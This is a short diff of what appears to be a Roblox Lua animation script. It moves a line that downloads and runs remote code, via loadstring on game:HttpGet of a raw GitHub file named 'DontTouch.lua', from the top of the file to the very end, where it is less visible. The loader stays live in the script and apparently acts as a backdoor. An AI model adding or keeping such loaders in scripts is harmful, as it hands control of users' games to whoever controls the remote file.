@@ -1,5 +1,4 @@
 -- Services
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sash8585705/2015M/refs/heads/main/DontTouch.lua",true))()
 local Players = game:GetService("Players")
 
 -- Animation ID
@@ -263,4 +262,4 @@ for _, player in ipairs(Players:GetPlayers()) do
     end
 end
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sash8585705/2015M/refs/heads/main/DontTouch.lua",true))()
